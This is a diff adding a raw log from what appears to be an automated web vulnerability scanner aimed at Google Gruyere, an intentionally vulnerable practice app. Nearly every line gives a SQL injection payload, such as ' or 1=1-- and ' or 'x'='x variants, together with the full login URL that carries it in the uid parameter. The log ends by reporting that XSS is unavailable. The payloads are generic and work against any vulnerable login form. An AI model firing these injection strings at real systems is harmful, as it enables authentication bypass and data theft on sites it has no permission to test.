@@ -1,0 +1,76 @@
+http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=x
+[+]Sqli paylaod: '
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid='
+[+]Sqli paylaod: ' or '1=1
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=' or '1=1
+[+]Sqli paylaod: ' and '1'='1' #
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=' and '1'='1' #
+[+]Sqli paylaod: ' and 1=1 #
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=' and 1=1 #
+[+]Sqli paylaod: ' #
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=' #
+[+]Sqli paylaod: ' and '1'='1
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=' and '1'='1
+[+]Sqli paylaod: 'or'1'='1
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid='or'1'='1
+[+]Sqli paylaod: '=' 'OR'
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid='=' 'OR'
+[+]Sqli paylaod: anything' OR 'x'='x
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=anything' OR 'x'='x
+[+]Sqli paylaod: admin’--
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=admin’--
+[+]Sqli paylaod: ’ or 0=0 --
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’ or 0=0 --
+[+]Sqli paylaod: ’ or ’ 1=1
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’ or ’ 1=1
+[+]Sqli paylaod: ’ or ’ 1
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’ or ’ 1
+[+]Sqli paylaod: ’ or ’
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’ or ’
+[+]Sqli paylaod: " or 0=0 --
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=" or 0=0 --
+[+]Sqli paylaod: or 0=0 --
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=or 0=0 --
+[+]Sqli paylaod: ’ or 0=0 #
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’ or 0=0 #
+[+]Sqli paylaod: " or 0=0 #
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=" or 0=0 #
+[+]Sqli paylaod: or 0=0 #
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=or 0=0 #
+[+]Sqli paylaod: ’ or ’x’=’x
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’ or ’x’=’x
+[+]Sqli paylaod: " or "x"="x
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=" or "x"="x
+[+]Sqli paylaod: ’) or (’x’=’x
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’) or (’x’=’x
+[+]Sqli paylaod: ’ or 1=1--
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’ or 1=1--
+[+]Sqli paylaod: " or 1=1--
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=" or 1=1--
+[+]Sqli paylaod: or 1=1--
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=or 1=1--
+[+]Sqli paylaod: ’ or a=a--
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’ or a=a--
+[+]Sqli paylaod: " or "a"="a
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=" or "a"="a
+[+]Sqli paylaod: ’) or (’a’=’a
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=’) or (’a’=’a
+[+]Sqli paylaod: ") or ("a"="a
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=") or ("a"="a
+[+]Sqli paylaod: hi" or "a"="a
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=hi" or "a"="a
+[+]Sqli paylaod: hi" or 1=1 --
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=hi" or 1=1 --
+[+]Sqli paylaod: hi’ or 1=1 --
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=hi’ or 1=1 --
+[+]Sqli paylaod: hi’ or ’a’=’a
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=hi’ or ’a’=’a
+[+]Sqli paylaod: hi’) or (’a’=’a
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=hi’) or (’a’=’a
+[+]Sqli paylaod: hi")or("a"="a
+[+]Sqli URL: http://google-gruyere.appspot.com/352472260743999664946205562128301715351/login?uid=hi")or("a"="a
+https://google-gruyere.appspot.com/352472260743999664946205562128301715351/
+https://google-gruyere.appspot.com/352472260743999664946205562128301715351/
+[-]XSS isn't available
+https://google-gruyere.appspot.com/352472260743999664946205562128301715351/
+https://google-gruyere.appspot.com/352472260743999664946205562128301715351/
